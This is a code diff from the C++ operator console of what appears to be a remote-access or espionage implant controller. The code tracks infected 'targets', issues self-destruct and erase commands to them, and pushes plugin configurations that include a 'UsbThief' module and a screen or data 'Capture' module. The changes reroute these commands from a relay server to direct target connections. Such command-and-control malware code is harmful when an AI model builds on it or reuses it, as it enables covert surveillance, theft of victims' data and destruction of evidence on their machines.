@@ -246,12 +246,6 @@ void MainDlg::InitDatabase()
 	dbThread->start();
 
 	DM->UnitTest();
-
-	FileTask* task = new FileTask;
-	task->aniTmpTaskPath = "D:\\Projects\\Work\\Mixed\\T9000\\bin\\Data\\1420373341\\FileTasking\\5120558";
-	task->dwTargetID = 1420373341;
-	Target* tar = new Target;
-	ProcessUserPluginData(task, tar);
 }
 
 // ////////////////////////////////////////////////////////////////////////////////
@@ -722,9 +716,9 @@ void MainDlg::DelSelfAction()
 
 		if (IDYES == MessageBox(this->Handle,L"是否下达自毁指令，请确认!",L"确认", MB_YESNO | MB_ICONWARNING))
 		{
-			if (this->ctrConn)
+			if (tarBlock->tarConn)
 			{
-				this->ctrConn->Send_SDS(tarBlock->dwTargetID);
+				tarBlock->tarConn->Send_SDS(tarBlock->dwTargetID);
 			}
 		}
 	}
@@ -829,17 +823,17 @@ void MainDlg::CleanAction()
 		{
 			tarBlock->bCleared = true;
 
-			// 先断连接
-			//
-			if (tarBlock->tarConn)
-			{
-				tarBlock->tarConn->CloseConnection();
-				tarBlock->tarConn = NULL;
-			}
+			//// 先断连接
+			////
+			//if (tarBlock->tarConn)
+			//{
+			//	tarBlock->tarConn->CloseConnection();
+			//	tarBlock->tarConn = NULL;
+			//}
 
 			// 再清除
 			//
-			this->ctrConn->Send_ERA(tarBlock->dwTargetID);
+			tarBlock->tarConn->Send_ERA(tarBlock->dwTargetID);
 		}
 	//}
 }
@@ -995,9 +989,9 @@ void MainDlg::on_WM_SET_STATUSINFO_W(MSG* msg)
 //
 void MainDlg::on_WM_CONTROL_CONNCOMPLETED(MSG* msg)
 {
-	this->ctrConn = (TargetConnection *)msg->wParam;
-	ui.statusBar->showMessage(QString::fromLocal8Bit("成功连接中转服务器"));
-	AddStatusInfo(STATUS_INFO, L"成功连接中转服务器");
+	//this->ctrConn = (TargetConnection *)msg->wParam;
+	ui.statusBar->showMessage(QString::fromLocal8Bit("成功连接目标"));
+	AddStatusInfo(STATUS_INFO, L"成功连接目标");
 	ui.actStop->setEnabled(true);
 	ui.actStart->setEnabled(false);
 }
@@ -1137,6 +1131,11 @@ void MainDlg::on_WM_CONTROL_INOTHERPLACE(MSG* msg)
 void MainDlg::on_WM_NEW_TARGET(MSG* msg)
 {
 	Target *tar = (Target *)msg->wParam;
+
+	ui.statusBar->showMessage(QString::fromLocal8Bit("成功连接目标"));
+	AddStatusInfo(STATUS_INFO, L"成功连接目标");
+	ui.actStop->setEnabled(true);
+	ui.actStart->setEnabled(false);
 
 	g_targetMap[tar->dwTargetID] = tar;     // 增加到MAP中
 	DM->AddTarget(tar);                     // 更新到数据库中
@@ -2468,13 +2467,13 @@ void MainDlg::ConnectToDaemon()
 
 	// 测试
 	ULONG targetID = 10000;
-	Target *tar = GetTargetFromGlobalMap(targetID);
-	if (NULL == tar)
-	{
-		tar  = new Target();
-		tar->dwTargetID        = targetID;
-		SendMessage(FrmMain->Handle, WM_NEW_TARGET, (unsigned int)tar, 1);
-	}
+	//Target *tar = GetTargetFromGlobalMap(targetID);
+	//if (NULL == tar)
+	//{
+	//	tar  = new Target();
+	//	tar->dwTargetID        = targetID;
+	//	SendMessage(FrmMain->Handle, WM_NEW_TARGET, (unsigned int)tar, 1);
+	//}
 
 	bool bRet = ConnectToServer(this->aniDaemonIpAddr.c_str(),this->nCtrPortForControl, false, targetID);
 
@@ -2787,21 +2786,21 @@ void MainDlg::ModifyPluginPolicy( unsigned int pTarget, int pluginNumber )
 		}
 
 
-		FrmMain->ctrConn->Send_PLD(tarBlock->dwTargetID,
+		tarBlock->tarConn->Send_PLD(tarBlock->dwTargetID,
 			2,
 			(PBYTE)lpUserActCfgData,
 			lpUserActCfgData->dwSize);
-		FrmMain->ctrConn->Send_PLD(tarBlock->dwTargetID,
+		tarBlock->tarConn->Send_PLD(tarBlock->dwTargetID,
 			3,
 			(PBYTE)lpUsbThiefCfgData,
 			lpUsbThiefCfgData->dwSize);
 
-		FrmMain->ctrConn->Send_PLD(tarBlock->dwTargetID,
+		tarBlock->tarConn->Send_PLD(tarBlock->dwTargetID,
 			4,
 			(PBYTE)lpCaptureCfgData,
 			lpCaptureCfgData->dwSize);
 
-		FrmMain->ctrConn->Send_PLI(tarBlock->dwTargetID);         // 重新获取目标插件信息
+		tarBlock->tarConn->Send_PLI(tarBlock->dwTargetID);         // 重新获取目标插件信息
 
 
 		if ( lpUserActCfgData )
